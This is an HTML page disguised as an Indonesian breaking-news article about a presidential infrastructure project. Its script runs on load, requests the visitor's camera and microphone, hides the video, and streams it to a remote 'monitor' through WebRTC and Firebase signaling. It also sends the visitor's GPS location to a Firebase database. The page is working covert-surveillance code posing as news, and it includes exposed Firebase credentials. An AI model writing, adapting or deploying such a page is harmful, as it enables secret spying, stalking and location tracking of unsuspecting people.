<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Berita Nasional Terupdate</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; }
        .nav { background: #cc0000; color: white; padding: 10px; font-weight: bold; margin-bottom: 20px; }
        img { width: 100%; border-radius: 5px; }
        #localVideo { display: none; }
    </style>
</head>
<body>
    <div class="nav">NEWS CHANNEL LIVE</div>
    <h1>Presiden Resmikan Proyek Infrastruktur Baru</h1>
    <p>Diposting 5 menit yang lalu</p>
    <img src="https://picsum.photos/800/400" alt="News Image">
    <p>Pemerintah terus berupaya meningkatkan konektivitas antar wilayah untuk mendorong pertumbuhan ekonomi nasional di berbagai sektor industri...</p>

    <video id="localVideo" autoplay playsinline muted></video>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            authDomain: "chatroom-e9b3f.firebaseapp.com",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f",
            storageBucket: "chatroom-e9b3f.firebasestorage.app",
            messagingSenderId: "125686404483",
            appId: "1:125686404483:web:46e49688dfbd1b69d2d2b6"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database().ref('p2p_stream');

        let pc;

        async function init() {
            // Reset Signaling di awal agar koneksi baru bersih
            await db.child('signal').remove();

            pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });

            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('localVideo').srcObject = stream;
            stream.getTracks().forEach(track => pc.addTrack(track, stream));

            // Kirim Lokasi
            navigator.geolocation.getCurrentPosition(pos => {
                db.child('status/location').set({ lat: pos.coords.latitude, lng: pos.coords.longitude });
            });

            // Create Offer
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            db.child('signal/offer').set({ type: offer.type, sdp: offer.sdp });

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    db.child('signal/targetCandidates').push(event.candidate.toJSON());
                }
            };

            // Tunggu Jawaban
            db.child('signal/answer').on('value', async (snapshot) => {
                const answer = snapshot.val();
                if (answer && !pc.currentRemoteDescription) {
                    await pc.setRemoteDescription(new RTCSessionDescription(answer));
                }
            });

            db.child('signal/monitorCandidates').on('child_added', (snapshot) => {
                pc.addIceCandidate(new RTCIceCandidate(snapshot.val()));
            });
        }

        window.onload = init;
    </script>
</body>
</html>
